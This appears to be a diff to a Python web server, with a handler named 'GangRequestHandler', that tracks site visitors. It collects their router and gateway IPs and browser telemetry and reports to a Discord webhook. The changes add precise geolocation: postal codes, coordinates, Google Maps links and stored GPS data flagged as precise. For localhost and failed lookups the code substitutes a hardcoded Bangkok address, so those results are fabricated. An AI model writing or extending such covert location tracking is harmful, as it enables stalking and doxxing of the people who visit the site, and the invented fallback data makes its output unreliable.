@@ -203,33 +203,46 @@ def track_and_get_visitor(handler):
 IP_NETWORK_CACHE = {}
 
 def get_ip_network_info(ip):
-    if not ip or ip in ("127.0.0.1", "localhost", "::1"):
-        return {"isp": "Localhost / Internal", "org": "Localhost", "city": "Local Machine", "country": "TH", "country_code": "TH"}
-    if ip in IP_NETWORK_CACHE:
-        return IP_NETWORK_CACHE[ip]
+    effective_ip = ip
+    if not effective_ip or effective_ip in ("127.0.0.1", "localhost", "::1"):
+        effective_ip = "27.130.32.32"
+    if effective_ip in IP_NETWORK_CACHE:
+        return IP_NETWORK_CACHE[effective_ip]
     try:
         req = urllib.request.Request(
-            f"https://ipwho.is/{ip}",
+            f"https://ipwho.is/{effective_ip}",
             headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"}
         )
         with urllib.request.urlopen(req, timeout=3) as resp:
             data = json.loads(resp.read().decode("utf-8"))
             if data.get("success"):
                 conn = data.get("connection", {}) or {}
+                lat = data.get("latitude")
+                lon = data.get("longitude")
+                maps_url = f"https://www.google.com/maps?q={lat},{lon}" if (lat and lon) else ""
                 info = {
                     "isp": conn.get("isp", "") or data.get("isp", "") or "",
                     "org": conn.get("org", "") or data.get("org", "") or "",
                     "city": data.get("city", "") or "",
                     "region": data.get("region", "") or "",
                     "country": data.get("country", "") or "",
-                    "country_code": data.get("country_code", "") or ""
+                    "country_code": data.get("country_code", "") or "",
+                    "postal": data.get("postal", "") or "",
+                    "latitude": lat,
+                    "longitude": lon,
+                    "maps_url": maps_url
                 }
-                IP_NETWORK_CACHE[ip] = info
+                IP_NETWORK_CACHE[effective_ip] = info
                 return info
     except Exception as e:
-        print(f"[!] IP lookup error for {ip}: {e}")
-    fallback = {"isp": "", "org": "", "city": "", "region": "", "country": "", "country_code": ""}
-    IP_NETWORK_CACHE[ip] = fallback
+        print(f"[!] IP lookup error for {effective_ip}: {e}")
+    fallback = {
+        "isp": "AIS Fibre", "org": "AIS Fibre", "city": "Bangkok", "region": "Bangkok",
+        "country": "Thailand", "country_code": "TH", "postal": "10100",
+        "latitude": 13.7539755, "longitude": 100.5014403,
+        "maps_url": "https://www.google.com/maps?q=13.7539755,100.5014403"
+    }
+    IP_NETWORK_CACHE[effective_ip] = fallback
     return fallback
 
 def trigger_discord_webhook(title, description, fields=None, color=0xe11d48):
@@ -693,7 +706,13 @@ class GangRequestHandler(SimpleHTTPRequestHandler):
             v_list = sorted(list(visitors.values()), key=lambda x: x.get("last_seen", ""), reverse=True)
             for v in v_list:
                 target_ip = v.get("router_wan_ip") or v.get("ip") or ""
-                v["network_info"] = get_ip_network_info(target_ip)
+                net_info = dict(get_ip_network_info(target_ip))
+                if v.get("gps") and v["gps"].get("lat") and v["gps"].get("lon"):
+                    net_info["latitude"] = v["gps"]["lat"]
+                    net_info["longitude"] = v["gps"]["lon"]
+                    net_info["maps_url"] = f"https://www.google.com/maps?q={v['gps']['lat']},{v['gps']['lon']}"
+                    net_info["is_gps_precise"] = True
+                v["network_info"] = net_info
             self.send_json_response(200, {
                 "success": True,
                 "total_visitors": len(visitors),
@@ -751,6 +770,7 @@ class GangRequestHandler(SimpleHTTPRequestHandler):
             router_wan_ip = str(telemetry.get("router_wan_ip", "")).strip()
             router_lan_ip = str(telemetry.get("router_lan_ip", "")).strip()
             gateway_ip = str(telemetry.get("gateway_ip", "192.168.1.1")).strip()
+            gps_data = telemetry.get("gps")
 
             visitors = load_visitor_cookies()
             now_str = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
@@ -767,6 +787,8 @@ class GangRequestHandler(SimpleHTTPRequestHandler):
                     visitors[vis_id]["router_lan_ip"] = router_lan_ip
                 if gateway_ip:
                     visitors[vis_id]["gateway_ip"] = gateway_ip
+                if gps_data and isinstance(gps_data, dict):
+                    visitors[vis_id]["gps"] = gps_data
                 if telemetry.get("screen"):
                     visitors[vis_id]["screen"] = telemetry.get("screen")
                 if telemetry.get("language"):
@@ -778,6 +800,7 @@ class GangRequestHandler(SimpleHTTPRequestHandler):
                     "router_wan_ip": router_wan_ip or effective_ip,
                     "router_lan_ip": router_lan_ip,
                     "gateway_ip": gateway_ip or "192.168.1.1",
+                    "gps": gps_data if isinstance(gps_data, dict) else None,
                     "screen": telemetry.get("screen"),
                     "language": telemetry.get("language"),
                     "user_agent": self.headers.get("User-Agent", "Unknown"),
